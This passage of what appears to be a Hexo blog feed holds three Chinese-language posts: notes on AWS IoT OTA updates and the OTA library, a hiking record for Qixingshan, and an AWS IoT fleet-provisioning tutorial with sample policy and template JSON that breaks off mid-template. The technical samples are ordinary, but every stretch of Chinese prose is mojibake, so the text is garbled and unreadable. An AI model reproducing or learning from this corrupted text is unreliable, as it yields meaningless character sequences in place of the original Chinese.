API</td><td>CreateJob</td><td>CreateOTAUpdate</td></tr><tr><td>ç¨‹å¼ç¢¼ç°½ç½²</td><td>éœ€ä½¿ç”¨è€…è‡ªè¡Œå¯¦è¸</td><td>å·²æ•´åˆ</td></tr><tr><td>HTTP&#x2F;MQTT</td><td>éœ€ä½¿ç”¨è€…è‡ªè¡Œé¸æ“‡</td><td>å·²æ•´åˆ</td></tr><tr><td>æ”¯æ´AWS IoT Device SDK</td><td>C, C++, Python, Java, Javascript</td><td>åƒ…æœ‰ C</td></tr><tr><td>Platform Abstraction Layer (PAL)</td><td>ç„¡</td><td>æœ‰ [3]</td></tr><tr><td>Max æª”æ¡ˆé™åˆ¶</td><td>HTTP: <strong>5GB (Amazon S3 limit)</strong>, MQTT: <strong>24MB (MQTT file stream limit)</strong></td><td>16MB (OTA update limit)[4]</td></tr></tbody></table><h2 id="AWS-IoT-Over-The-Air-OTA-Library"><a href="#AWS-IoT-Over-The-Air-OTA-Library" class="headerlink" title="AWS IoT Over-The-Air (OTA) Library"></a>AWS IoT Over-The-Air (OTA) Library</h2><blockquote><p><a href="https://github.com/aws/ota-for-aws-iot-embedded-sdk">https://github.com/aws/ota-for-aws-iot-embedded-sdk</a></p></blockquote><p>é€™å€‹AWSå‡½å¼åº«åŒæ™‚åŒ…å«äº†ï¼ŒFreeRTOS ä»¥åŠ AWS IoT Device SDK for Embedded-C</p><p>é€™å€‹å‡½å¼åº«åŒæ™‚åŒ…å«äº†<strong>OTA Platform Abstration Layer (PAL)</strong> [3] ä¾†å»ç°¡åŒ–å°‡å‡½å¼åº«é·ç§»åˆ°ç‰¹å®šç¡¬é«”çš„é›£åº¦ [5]ã€‚</p><p>ä¹Ÿæœ‰  OTA Operating System (OS) Functional Interface ä¾†å»ç°¡åŒ–ç§»æ¤åˆ° FreeRTOS ä»¥å¤–çš„ RTOS ç”šè‡³æ˜¯è£¸æ©Ÿçš„å›°é›£åº¦ã€‚</p><blockquote><p>ç”±æ–¼ AWS IoT OTA é©ç”¨æ–¼è³‡æºå—é™çš„è¨­å‚™ï¼Œå› æ­¤åœ¨åŸç”Ÿçš„Device SDK ä¸¦æ²’æœ‰æ•´åˆ FreeRTOSã€‚å‡ºæ–¼åŒæ¨£çš„åŸå› ï¼ŒOTA æª”æ¡ˆå¤§å°é™åˆ¶ç‚º 16MBã€‚</p></blockquote><h2 id="åƒè€ƒè³‡æ–™"><a href="#åƒè€ƒè³‡æ–™" class="headerlink" title="åƒè€ƒè³‡æ–™"></a>åƒè€ƒè³‡æ–™</h2><p>[1] <a href="https://www.freertos.org/freertos-core/over-the-air-updates/index.html">https://www.freertos.org/freertos-core/over-the-air-updates/index.html</a><br>[2] <a href="https://repost.aws/articles/ARDHNhV0bnRGau0kmdhTSZZA/comparing-aws-iot-jobs-and-aws-iot-over-the-air-ota-updates">https://repost.aws/articles/ARDHNhV0bnRGau0kmdhTSZZA/comparing-aws-iot-jobs-and-aws-iot-over-the-air-ota-updates</a><br>[3] <a href="https://www.freertos.org/Documentation/api-ref/ota-for-aws-iot-embedded-sdk/docs/doxygen/output/html/ota_pal_interface.html">https://www.freertos.org/Documentation/api-ref/ota-for-aws-iot-embedded-sdk/docs/doxygen/output/html/ota_pal_interface.html</a><br>[4] <a href="https://docs.aws.amazon.com/general/latest/gr/amazon-freertos.html#limits-ota-manager">https://docs.aws.amazon.com/general/latest/gr/amazon-freertos.html#limits-ota-manager</a><br>[5] Porting Guide - <a href="https://www.freertos.org/Documentation/api-ref/ota-for-aws-iot-embedded-sdk/docs/doxygen/output/html/ota_porting.html">https://www.freertos.org/Documentation/api-ref/ota-for-aws-iot-embedded-sdk/docs/doxygen/output/html/ota_porting.html</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¸ç¿’ç­†è¨˜ ota-update </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> IoT </tag>
            
            <tag> OTA </tag>
            
            <tag> Firmware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€çˆ¬å±±ç´€éŒ„ã€‘ä¸ƒæ˜Ÿå±±ä¸»å³° + æ±å³°</title>
      <link href="/posts/22f14c54.html"/>
      <url>/posts/22f14c54.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç°¡ä»‹"><a href="#ç°¡ä»‹" class="headerlink" title="ç°¡ä»‹"></a>ç°¡ä»‹</h2><p>ç”±æ–¼ç”Ÿé•·åœ¨å°åŒ—å¤šå¹´é‚„æ²’å»ä¸ƒæ˜Ÿå±±ä¸»å³°çš„ä¸‰è§’é»ï¼Œè¶è‘—é›£å¾—çš„å¥½å¤©æ°£å‡ºéŠè¸©é»</p><p>é€™æ¬¡çˆ¬ä¸ƒæ˜Ÿå±±çš„ä¸»è¦è·¯ç·šæ˜¯å¾ <strong>å°æ²¹å‘ç™»å±±å£</strong> -&gt; <strong>ä¸ƒæ˜Ÿå±±ä¸»å³°</strong> -&gt; <strong>ä¸ƒæ˜Ÿå±±æ±å³°</strong>ï¼Œæ¥è‘—åŸè·¯è¿”å›åˆ° <strong>å°æ²¹å‘åœè»Šå ´</strong></p><p><img src="/img/mountain-1/161346.jpg"></p><p>ä¸ƒæ˜Ÿå±±æ˜¯å°åŒ—å¸‚å…§æœ€é«˜çš„å±±ï¼Œæµ·æ‹”é”åˆ° <code>1120</code> å…¬å°º</p><h2 id="å°æ²¹å‘åœ°ç†±å£"><a href="#å°æ²¹å‘åœ°ç†±å£" class="headerlink" title="å°æ²¹å‘åœ°ç†±å£"></a>å°æ²¹å‘åœ°ç†±å£</h2><p>åœ°ç†±å£é™„è¿‘ç¡«ç£ºå‘³å¾ˆé‡ï¼Œä½†å¤©æ°£å†·å…¶å¯¦é è¿‘æŒºæš–çš„<br><img src="/img/mountain-1/m1.jpg"></p><p>æ¹§å‡ºçš„ç¡«ç£ºæ³‰æœƒæ²¸é¨°å†’æ³¡<br><img src="/img/mountain-1/m2.jpg"><br><img src="/img/mountain-1/m3.jpg"><br><img src="/img/mountain-1/m4.jpg"><br><img src="/img/mountain-1/m5.jpg"><br><img src="/img/mountain-1/m6.jpg"></p><h2 id="ä¸ƒæ˜Ÿå±±ä¸»å³°"><a href="#ä¸ƒæ˜Ÿå±±ä¸»å³°" class="headerlink" title="ä¸ƒæ˜Ÿå±±ä¸»å³°"></a>ä¸ƒæ˜Ÿå±±ä¸»å³°</h2><p>é€šå¾€ä¸»å³°çš„è·¯ä¸Šå¹¾ä¹éƒ½æ˜¯çŸ³é ­éšæ¢¯ï¼Œä½†éšæ¢¯è·¯é€”ä¸­æŒºå¤šé™¡ä¸Šï¼Œ<strong>å»ºè­°æ”œå¸¶ç™»å±±æ–</strong></p><p><img src="/img/mountain-1/m13.jpg"><br><img src="/img/mountain-1/m8.jpg"></p><p>ç¾åœ¨æ˜¯11æœˆçš„èŠ’è‰å­£ï¼Œä½†é€™è£¡é¢¨å¤§ï¼ŒèŠ’è‰éƒ½è¢«å¹å¾—å½æ›²ï¼Œä½†æ™¯è‰²é‚„æ˜¯æŒºç¾</p><p><img src="/img/mountain-1/m7.jpg"><br><img src="/img/mountain-1/m10.jpg"></p><p>å‡æ—¥æœƒå¾ˆå¤šç™»å±±å®¢è¦ä¾†è·Ÿé€™æ ¹æ‹ç…§ï¼Œå°±è‡ªè¡Œè€ƒé‡è¦ä¸è¦ç•™å€‹ç´€å¿µäº†<br><img src="/img/mountain-1/m9.jpg"></p><h2 id="ä¸ƒæ˜Ÿå±±æ±å³°"><a href="#ä¸ƒæ˜Ÿå±±æ±å³°" class="headerlink" title="ä¸ƒæ˜Ÿå±±æ±å³°"></a>ä¸ƒæ˜Ÿå±±æ±å³°</h2><p>ä¸»å³°å¾€æ±å³°çš„è·¯æ®µåªéœ€å†èµ° <code>0.3K</code>ï¼Œå¯ä»¥é¸æ“‡ä¸€æ¬¡è’é›†å…©å€‹å³°é ‚ã€‚ä½†å¾ä¸ƒæ˜Ÿä¸»å³°åˆ°ä¸ƒæ˜Ÿæ±å³°çš„éƒ¨åˆ†è·¯æ®µè¼ƒç‚ºæ¿•æ»‘ï¼Œå»ºè­°ç©¿æœ‰é˜²æ»‘çš„ç™»å±±é‹ä¾†ã€‚</p><h2 id="è‰å¢"><a href="#è‰å¢" class="headerlink" title="è‰å¢"></a>è‰å¢</h2><p>é †å¸¶ä¸€æï¼Œä¸€è·¯ä¸Šéƒ½æœ‰å¾ˆå¤šåƒæ˜¯ä¸‹é¢é€™æ¨£ï¼Œäººå¯ä»¥é€šéçš„æ¨¹å¢ï¼Œå¦‚æœé€éé›¢ç·šåœ°åœ–çœ‹æ˜¯å¯ä»¥ç™¼ç¾è·¯çš„ï¼Œè€Œä¸”ä¹Ÿèƒ½ç™¼ç¾æœ‰ç¶ç¹©å­ï¼ŒèˆŠå‹é€²å»ç¨å¾®æ¢éšªä¸€ä¸‹ï¼Œä½†ç”±æ–¼å¾Œé¢æ³¥æ¿˜å¤ªå¤šï¼Œå°±æ²’æœ‰æ·±å…¥å¾€ä¸‹æ¢ä¸‹å»äº†</p><p><img src="/img/mountain-1/m11.jpg"><br><img src="/img/mountain-1/m12.jpg"><br><img src="/img/mountain-1/m14.jpg"></p><p>æ±å³°çš„æ™¯è‰²å€‹äººè¦ºå¾—é‚„å¥½ï¼Œä½†ä¹Ÿæ˜¯å¤šäººè·Ÿè‘—åˆç…§ã€‚</p><p><img src="/img/mountain-1/m15.jpg"></p><p>ä¹‹å¾Œå°±åŸè·¯è¿”å›åœè»Šå ´ï¼ŒçµæŸä»Šå¤©çš„æ—…ç¨‹äº†</p><blockquote><p>å…¶å¯¦å¤§å¤šæ•¸äººéƒ½æœƒå¾å°æ²¹å‘ä¸Šå»åˆ°ä¸»å³°å†åˆ°æ±å³°ï¼Œå†å¾å†·æ°´å‘ä¸‹å»æˆ–æ˜¯åå‘è·¯ç·šï¼Œä½†ç”±æ–¼æœ‰é–‹è»Šå°±åªèƒ½åŸè·¯ä¾†å›æ‹‰</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> çˆ¬å±±å¥è¡Œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŒ—éƒ¨ </tag>
            
            <tag> å°ç™¾å²³ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ©Ÿç¾¤ä½ˆå»º(Fleet Provisioning) - é å…ˆä½ˆå»ºè£ç½®åˆ° AWS IoT</title>
      <link href="/posts/889a40ef.html"/>
      <url>/posts/889a40ef.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç°¡ä»‹"><a href="#ç°¡ä»‹" class="headerlink" title="ç°¡ä»‹"></a>ç°¡ä»‹</h2><h2 id="ä»€éº¼æ˜¯æ©Ÿç¾¤ä½ˆå»º-Fleet-Provisioning"><a href="#ä»€éº¼æ˜¯æ©Ÿç¾¤ä½ˆå»º-Fleet-Provisioning" class="headerlink" title="ä»€éº¼æ˜¯æ©Ÿç¾¤ä½ˆå»º(Fleet Provisioning)?"></a>ä»€éº¼æ˜¯æ©Ÿç¾¤ä½ˆå»º(Fleet Provisioning)?</h2><p>æ©Ÿç¾¤ä½ˆå»ºç•¶ä¸­ä¹Ÿæœ‰åˆ†æˆ <strong>è¦æ±‚ä½ˆå»º ï¼ˆProvisioning by Claimï¼‰</strong> é‚„æœ‰ <strong>é€éä¿¡ä»»çš„ä½¿ç”¨è€…ä½ˆå»º ï¼ˆProvisioning by Trusted Userï¼‰</strong></p><h3 id="è¦æ±‚ä½ˆå»º"><a href="#è¦æ±‚ä½ˆå»º" class="headerlink" title="è¦æ±‚ä½ˆå»º"></a>è¦æ±‚ä½ˆå»º</h3><p>è£ç½®å¯ä»¥ä½¿ç”¨å…§åµŒçš„ä½ˆå»ºå®£å‘Šæ†‘è­‰ï¼ˆClaim Certificateï¼‰(é€™æ˜¯ç‰¹æ®Šç”¨é€”çš„æ†‘è­‰) å’Œç§æœ‰é‡‘é‘°  ä¾†è£½é€ ã€‚å¦‚æœé€™äº›æ†‘è­‰å·²å‘ AWS IoT è¨»å†Šï¼Œè©²æœå‹™å¯ä»¥å°‡å®ƒå€‘äº¤æ›ç‚ºè£ç½®å¯ç”¨æ–¼ä¸€èˆ¬æ“ä½œçš„å”¯ä¸€è£ç½®æ†‘è­‰ã€‚</p><h3 id="é€éä¿¡ä»»çš„ä½¿ç”¨è€…ä½ˆå»º"><a href="#é€éä¿¡ä»»çš„ä½¿ç”¨è€…ä½ˆå»º" class="headerlink" title="é€éä¿¡ä»»çš„ä½¿ç”¨è€…ä½ˆå»º"></a>é€éä¿¡ä»»çš„ä½¿ç”¨è€…ä½ˆå»º</h3><p>åœ¨è¨±å¤šæƒ…æ³ä¸‹ï¼Œå¦‚çµ‚ç«¯ä½¿ç”¨è€…æˆ–å®‰è£æŠ€è¡“äººå“¡ç­‰ä¿¡ä»»çš„ä½¿ç”¨è€…åˆæ¬¡ä½¿ç”¨è¡Œå‹•æ‡‰ç”¨ç¨‹å¼åœ¨å…¶éƒ¨ç½²çš„ä½ç½®è¨­å®šè£ç½®æ™‚ï¼Œè£ç½®æœƒé€£ç·šè‡³ AWS IoT</p><blockquote><p>åœ¨æœ¬ç¯‡æ–‡ç« ä¸­ï¼Œä¸»è¦æœƒä»‹ç´¹é€é <strong>è¦æ±‚ä½ˆå»º</strong> çš„æ–¹å¼ä¾†å»é€²è¡Œæ©Ÿç¾¤ä½ˆå»º</p></blockquote><h2 id="è¦æ±‚ä½ˆå»ºçš„æµç¨‹"><a href="#è¦æ±‚ä½ˆå»ºçš„æµç¨‹" class="headerlink" title="è¦æ±‚ä½ˆå»ºçš„æµç¨‹"></a>è¦æ±‚ä½ˆå»ºçš„æµç¨‹</h2><p><img src="https://i.imgur.com/5UPLkKJ.png" alt="Imgur"></p><h2 id="è¨­ç½®-AWS-IoT-Core"><a href="#è¨­ç½®-AWS-IoT-Core" class="headerlink" title="è¨­ç½® - AWS IoT Core"></a>è¨­ç½® - AWS IoT Core</h2><h3 id="å»ºç«‹æ†‘è­‰ä»¥åŠå…¬ç§é‘°å°"><a href="#å»ºç«‹æ†‘è­‰ä»¥åŠå…¬ç§é‘°å°" class="headerlink" title="å»ºç«‹æ†‘è­‰ä»¥åŠå…¬ç§é‘°å°"></a>å»ºç«‹æ†‘è­‰ä»¥åŠå…¬ç§é‘°å°</h3><p>ç”¢ç”Ÿç”¨æ–¼ä½ˆå»ºçš„æ†‘è­‰ã€‚</p><ul><li>å¯ä»¥åœ¨ AWS IoT Console ä¸Šçš„ <strong>Secure</strong> &gt;&gt; <strong>Certificates</strong> &gt;&gt; <strong>Add Certificates</strong> &gt;&gt; <strong>Create Certificates</strong></li></ul><p><img src="https://i.imgur.com/ay2zm5V.png" alt="Imgur"><br><img src="https://i.imgur.com/Qnr2Olh.png" alt="Imgur"></p><ul><li>æ¥è‘—æœƒè·³å‡ºå°æ‡‰çš„ç•«é¢ï¼Œæœƒéœ€è¦å»ä¸‹è¼‰æ†‘è­‰è·Ÿç§é‘°åˆ°æœ¬åœ°ç«¯ï¼Œå¦å¤–ç‚ºäº†æ–¹ä¾¿ä¹Ÿè«‹å°‡ Root CA æ†‘è­‰ä¸‹è¼‰åˆ°æœ¬åœ°</li></ul><p><img src="https://i.imgur.com/kRUAGF9.png" alt="Imgur"></p><h3 id="å»ºç«‹-Provisioning-Template-ä¸¦ä¸”é™„åŠ -Policy"><a href="#å»ºç«‹-Provisioning-Template-ä¸¦ä¸”é™„åŠ -Policy" class="headerlink" title="å»ºç«‹ Provisioning Template ä¸¦ä¸”é™„åŠ  Policy"></a>å»ºç«‹ Provisioning Template ä¸¦ä¸”é™„åŠ  Policy</h3><ul><li>å»ºç«‹ Provisioning Template</li></ul><p><img src="https://i.imgur.com/cG83JRG.png" alt="Imgur"></p><ul><li>é¸æ“‡ <strong>Provisioning deivces with claim certificates</strong>ï¼Œä¹‹å¾Œé»é¸ <strong>Nexts</strong></li></ul><p><img src="https://i.imgur.com/7baFaol.png" alt="Imgur"></p><ul><li>å»ºç«‹çµ¦ IoT Service çš„ Roleï¼Œé»é¸ <strong>Create Role</strong></li><li>è¼¸å…¥å®Œç•¢ Role Name å¾Œé»é¸ <strong>View</strong></li></ul><p><img src="https://i.imgur.com/6bZNMWr.png" alt="Imgur"></p><ul><li>Attach policy</li><li>è«‹æœå°‹ä¸¦é™„åŠ  AWS ç®¡ç†çš„ Policy <code>AWSIoTThingsRegistration</code></li></ul><p><img src="https://i.imgur.com/MwkIdA0.png" alt="Imgur"><br><img src="https://i.imgur.com/YW2Nfdh.png" alt="Imgur"></p><ul><li>Claim certificate policyï¼Œé»é¸ <strong>Create IoT  Policy</strong></li></ul><p><img src="https://i.imgur.com/21XORly.png" alt="Imgur"></p><ul><li>å¡«å…¥ Policy Name ä¹‹å¾Œè²¼ä¸Šç¯„ä¾‹ JSON</li></ul><p><img src="https://i.imgur.com/mNKS8IC.png" alt="Imgur"></p><p>ç¯„ä¾‹ IoT Policy</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;iot:Connect&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;iot:Publish&quot;</span><span class="punctuation">,</span><span class="string">&quot;iot:Receive&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topic/$aws/certificates/create/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topic/$aws/provisioning-templates/templateName/provision/*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Subscribe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topicfilter/$aws/certificates/create/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topicfilter/$aws/provisioning-templates/templateName/provision/*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Hzebj7r.png" alt="Imgur"></p><ul><li>å‹¾é¸æ†‘è­‰</li></ul><p><img src="https://i.imgur.com/5y8PAPu.png" alt="Imgur"></p><p>å®Œæˆå¾Œå°±å¯ä»¥ä¾†è¨­å®šé ä½ˆå»º</p><h3 id="è¨­å®šé å…ˆä½ˆå»º"><a href="#è¨­å®šé å…ˆä½ˆå»º" class="headerlink" title="è¨­å®šé å…ˆä½ˆå»º"></a>è¨­å®šé å…ˆä½ˆå»º</h3><p>æ©Ÿç¾¤ä½ˆå»ºçš„ç¯„æœ¬ç¯„ä¾‹</p><blockquote><p><a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-template.html#fleet-provisioning-example">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-template.html#fleet-provisioning-example</a></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Parameters&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;ThingName&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;String&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SerialNumber&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;String&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;DeviceLocation&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;String&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Mappings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;LocationTable&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Seattle&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;LocationUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://example.aws&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Resources&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;thing&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Thing&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Properties&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;AttributePayload&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span> </span><br><span class="line">                    <span class="attr">&quot;version&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;v1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;serialNumber&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;serialNumber&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingName&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;ThingName&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingTypeName&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;Fn::Join&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="punctuation">[</span><span class="string">&quot;ThingPrefix_&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;SerialNumber&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingGroups&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;v1-lightbulbs&quot;</span><span class="punctuation">,</span> <span class="string">&quot;WA&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;BillingGroup&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LightBulbBillingGroup&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;OverrideSettings&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;AttributePayload&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;MERGE&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingTypeName&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;REPLACE&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingGroups&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;DO_NOTHING&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;certificate&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Certificate&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Properties&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;CertificateId&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Certificate::Id&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;Status&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Active&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;policy&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Policy&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Properties&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;PolicyDocument&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span 